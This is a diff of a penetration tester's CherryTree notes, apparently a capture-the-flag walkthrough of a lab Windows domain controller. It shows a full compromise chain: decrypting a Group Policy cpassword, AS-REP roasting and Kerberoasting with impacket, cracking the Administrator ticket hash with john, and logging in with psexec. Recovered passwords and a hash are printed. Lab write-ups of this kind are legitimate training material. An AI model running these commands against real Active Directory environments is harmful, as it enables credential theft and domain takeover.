@@ -17,7 +17,7 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1697233470">
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1697241065">
       <node name="Nmap" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697229881" ts_lastsave="1697230200">
         <rich_text>
 </rich_text>
@@ -25,7 +25,9 @@ Windows Proof: </rich_text>
         <rich_text>
 
 
-we see the  domain 
+we see the  domain </rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 so we update the /etc/hosts file
 
 
@@ -160,7 +162,9 @@ we find a file with credentials
         <rich_text>
 
 
-username: 
+username: </rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
  cpassword=</rich_text>
         <rich_text foreground="#5ebdab">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</rich_text>
         <rich_text>
@@ -178,10 +182,14 @@ the cpassword looks encrypted on some googling  i found
 
 we can decrypt it using the utlitiy in kali called gppdecrypt
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 and get the password
-password: 
+password: </rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 </rich_text>
         <codebox char_offset="41" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ActiveDirectory101  smbmap -H 10.10.10.100
@@ -220,16 +228,20 @@ password:
         <codebox char_offset="613" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GPPstillStandingStrong2k18</codebox>
       </node>
       <node name="Enum4linux" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697230905" ts_lastsave="1697237452">
+        <rich_text justification="left"></rich_text>
         <rich_text>
 
 
 
 then with the user 
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 </rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.10.100 | tee enum4linux.log
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct 13 16:50:55 2023
 
@@ -736,30 +748,42 @@ do_cmd: Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
 enum4linux complete on Fri Oct 13 18:35:02 2023
 </codebox>
       </node>
-      <node name="foothold" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697233470" ts_lastsave="1697234884">
+      <node name="foothold" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697233470" ts_lastsave="1697241044">
         <rich_text justification="left"></rich_text>
         <rich_text>
 
 didnt work so lets try kerberoasting
 
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 didint work
 
 trying smb again
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 output
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 
 downloading everythign:
 
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+from here we get the first flag
 </rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.100 -u SVC_TGS -p "GPPstillStandingStrong2k18" -s .</codebox>
         <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -format hashcat -outputfile hashes.asreproast</codebox>
@@ -792,6 +816,52 @@ downloading everythign:
         Users                                                   READ ONLY
 </codebox>
         <codebox char_offset="118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.100/Users -U SVC_TGS</codebox>
+      </node>
+      <node name="privEsc" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697241065" ts_lastsave="1697242222">
+        <rich_text>from the credentials  we got we can perform kerberoasting attack
+
+
+
+
+
+
+
+
+after crackign it use:
+
+
+
+
+</rich_text>
+        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type root.txt &amp;&amp; ipconfig /all</rich_text>
+        <codebox char_offset="66" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.100 admin.htb/SVC_TGS -outputfile hashes.kerberoast</codebox>
+        <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile hashes.kerberoast
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-10-13 15:37:59.953371             
+
+
+
+[-] CCache file is not found. Skipping..                                                 </codebox>
+        <codebox char_offset="72" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">[-] CCache file is not found. Skipping...
+                                                                                                                                                                           
+ Active  cat hashes.kerberoast
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c2241c2bf445147880a662ceeca0ed4c$a25f392552580db05b60842522fbbfe0ef3eb3764230e589a29c0be853d9ef56939e75a75003df8f3a7f3fed91325ac098432f7738eb8e7f2a4ea6bbc345ca92793f88abe7a9af3242be1f9a7afa195d0f34a3c1d2f415c63dc2d7cbb4eac5d921dc74f670a0cd0ec9e61641c0c2dd408f648fc6d4284d6fe43d376dfaa0bc6e3bca5325161f52601f11539ac6a6192a0b02216f11d95fca9cfc2c325d75327f34cf5a6311f6c2a2f79f645f7fa19fc655c443d501705a585098006bc766693108cd6bda74039d3de9c54c21cac930c1a762c3acae065545b0d13350144e26ce3585d4cef4911539c27af60f0738ec276d322146baec13120c9e1289db1c48154583d838521d6d7f97cf7c66fc25b5984e49a4a4076c204558bea1a0cc2f44bbf5fd736b9747a67abc54795692e975ab4c60d4626ddc06248619b6ed5c68ff6cab9bbfe707b30809e35e88907caf5172254e2ecd939daeae933067786be95f443f4b8f7a3b1b51fad1685855221e95afe42c31ed20b6a4e11edd121b02ff176040cdbf52bddd2ab0fcb193bd87f938dd1ca8bda8126419489b568e3938132f1d875d622383c736d696248ec85c124e20651d363c8047a478cc25bec88c6e29fa353c3cbe5ec1d6a2d5d7f4bf13de031a54aabed525b41bdf22495cc386568c71144a43cacf15751992789ff5a6f86198edd0910b2825d5663bd53506c7aa8d891f52cf7c8261ee92863781921ebad86234fd9b933ba457e14e96e699db795c138b26282413f712a90933d21a37e87b6fc66799ac1297cff631e702cead06db028bc4fcef9a24dcbc2b8305e15e008902c301a5ff9c39c54485195e3c485d1b3c63808c21b8d161bda0ef4b53fd53b670c15ecde5ba0ba88d1a4bf44aedfba39d04c5ef14a02a8277ca6b6540dd720b86f162f34a3f8afae519f723ec1f571cf9ec0353c6d673f202efcc3229f78e2f01a4f30a52c274b51ff3b607420fe758a83d1457e9338a082143824f956fa60d7458803e84a0c2451c873e54af163133448e61ddf1a19505f9797e7f964beff0c85a679754fb5e7e0f0de33f8ef18fb19f8ec2625e93b60d31e15b6cea63dec384d11ed4f491634abdc6d416c6c08fb121268475910ebb95f1b0876bb617d1d26ea4e53fac558f8cdaf2b2272805ddfb93740f96c7324a9ffeeef46cd3d7f911f0970fc416014a92950793065ed4da1d175cd66f83f2fe5c7af4c6f687fb7b00deb58ed7d27115aa7b079d
+                                                                                                                                                                           
+ Active  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)     
+1g 0:00:00:05 DONE (2023-10-13 20:01) 0.1754g/s 1848Kp/s 1848Kc/s 1848KC/s Tiffani1432..Thomas31121979
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                       </codebox>
+        <codebox char_offset="100" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.10.100</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
@@ -2408,7 +2478,7 @@ python3 /opt/impacket/examples/GetNPUsers.py active.htb/admin -request -no-pass 
             <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
           </node>
-          <node name="Kerberoasting" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239503" ts_lastsave="1697239618">
+          <node name="Kerberoasting" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239503" ts_lastsave="1697239640">
             <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
             <rich_text>
 
@@ -2416,13 +2486,17 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
             <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
             <rich_text>
 
-
-
-
-kerberoasting
-
-impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; example.local/username -outputfile hashes.txt
 </rich_text>
+            <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/">https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/</rich_text>
+            <rich_text>
+
+
+Run the following:
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <codebox char_offset="226" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; example.local/username -outputfile hashes.txt
+</codebox>
           </node>
         </node>
         <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
